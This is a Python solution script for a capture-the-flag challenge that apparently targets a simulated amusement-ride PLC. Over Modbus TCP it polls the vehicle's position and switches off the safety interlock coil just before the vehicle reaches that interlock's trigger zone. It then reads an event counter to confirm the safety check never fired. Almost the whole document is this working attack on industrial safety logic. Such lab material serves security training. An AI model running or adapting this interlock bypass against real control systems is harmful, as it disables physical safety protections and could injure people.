#!/usr/bin/env python3
"""
CTF Challenge 5: Safety Bypass
Difficulty: Hard
Points: 350

Objective: Bypass the safety interlock system and complete a full ride cycle

Solution:
- Safety systems check conditions at specific positions
- Timing is critical to bypass without triggering errors
- The web interface will detect successful bypass and award the flag
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_04_safety_bypass.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip, plc_port = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 502
    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Connection failed")
        sys.exit(1)

    print("[*] CTF Challenge 5: Safety Bypass")
    print("[*] Event 2 (Safety Interlock) triggers at position 3")
    print("[*] Waiting for vehicle to approach Event 2 zone...")

    # Wait for vehicle to get close to Event 2 zone, then disable it
    timeout = 60
    start_time = time.time()
    safety_bypassed = False
    last_position = -1

    while not safety_bypassed and (time.time() - start_time) < timeout:
        # Read current position
        pos_result = client.read_holding_registers(1, 1)  # current_position
        if not pos_result.isError():
            current_pos = pos_result.registers[0]

            if current_pos != last_position:
                print(f"\r[*] Vehicle position: {current_pos}", end="", flush=True)
                last_position = current_pos

            # When approaching Event 2 zone (position 3), disable it
            if current_pos >= 1 and current_pos <= 2 and not safety_bypassed:
                print("\n[*] Vehicle approaching Event 2 zone - disabling safety interlock...")
                client.write_coil(9, False)  # event_2_enable
                print("[+] Event 2 disabled!")

            # Check if vehicle passed through Event 2 zone
            if current_pos == 3:
                verify = client.read_coils(9, 1)  # event_2_enable
                if not verify.isError() and not verify.bits[0]:
                    print("\n[+] Vehicle at Event 2 zone (position 3) - Safety interlock is DISABLED!")

                    # Check event counter to confirm it didn't trigger
                    counter_before = client.read_holding_registers(1045, 1)  # event_2_counter
                    time.sleep(2)  # Wait while in zone
                    counter_after = client.read_holding_registers(1045, 1)

                    if not counter_before.isError() and not counter_after.isError():
                        before = counter_before.registers[0]
                        after = counter_after.registers[0]
                        print(f"[*] Event 2 counter: {before} -> {after}")

                        if after == before:
                            print("[+] Safety check successfully bypassed - counter did not increment!")
                            safety_bypassed = True

            # Exit after passing Event 2 zone
            if current_pos > 4 and safety_bypassed:
                break

        time.sleep(0.2)

    if safety_bypassed:
        print("\n\n[+] Challenge condition met!")
        print("[*] Safety interlock was bypassed when vehicle entered its trigger zone")
        print("[*] Check the web interface for flag capture notification")
    else:
        print("\n\n[!] Timeout or safety check was not properly bypassed")
    client.close()

if __name__ == "__main__":
    main()
